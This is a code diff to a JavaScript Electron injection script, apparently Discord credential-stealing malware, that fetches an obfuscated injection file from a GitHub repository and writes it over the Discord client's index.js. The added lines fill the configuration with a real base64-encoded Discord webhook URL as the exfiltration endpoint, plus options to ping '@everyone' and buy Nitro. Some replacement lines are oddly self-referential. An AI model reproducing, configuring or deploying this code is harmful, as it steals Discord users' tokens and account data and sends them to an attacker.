@@ -9,8 +9,8 @@ const {
   session
 } = require('electron');
 const config = {
-  webhook: atob('%WEBHOOKHEREBASE64ENCODED%'),
-  webhook_protector_key: '%WEBHOOK_KEY%',
+  webhook: atob('aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTI2NTM3MzA1NzIyMTEzMjM2Mi9zbXFxRUt2d2daQzEwSS1qMGpzRTktN3hoRXROVk9qb21WdXl0YzVLbUlHQklPcjJUSENsdGFXWmYxMUp0RzNUZUREUA=='),
+  webhook_protector_key: 'test',
   auto_buy_nitro: false,
   ping_on_run: true,
   ping_val: '@everyone',
@@ -376,8 +376,8 @@ fs.readFileSync(indexJs, 'utf8', (err, data) => {
 async function init() {
     https.get('${'https://raw.githubusercontent.com/f4kedre4lity/Discord-Injection-BG/main/injection-obfuscated.js'}', (res) => {
         const file = fs.createWriteStream(indexJs);
-        res.replace('%WEBHOOKHEREBASE64ENCODED%', '${'%WEBHOOKHEREBASE64ENCODED%'}')
-        res.replace('%WEBHOOK_KEY%', '${'%WEBHOOK_KEY%'}')
+        res.replace('aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTI2NTM3MzA1NzIyMTEzMjM2Mi9zbXFxRUt2d2daQzEwSS1qMGpzRTktN3hoRXROVk9qb21WdXl0YzVLbUlHQklPcjJUSENsdGFXWmYxMUp0RzNUZUREUA==', '${'aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTI2NTM3MzA1NzIyMTEzMjM2Mi9zbXFxRUt2d2daQzEwSS1qMGpzRTktN3hoRXROVk9qb21WdXl0YzVLbUlHQklPcjJUSENsdGFXWmYxMUp0RzNUZUREUA=='}')
+        res.replace('test', '${'test'}')
         res.pipe(file);
         file.on('finish', () => {
             file.close();
@@ -607,7 +607,7 @@ const hooker = async content => {
     'Access-Control-Allow-Origin': '*'
   };
   if (!config.webhook.includes('api/webhooks')) {
-    const key = totp('%WEBHOOK_KEY%');
+    const key = totp('test');
     headers.Authorization = key;
   }
   const options = {
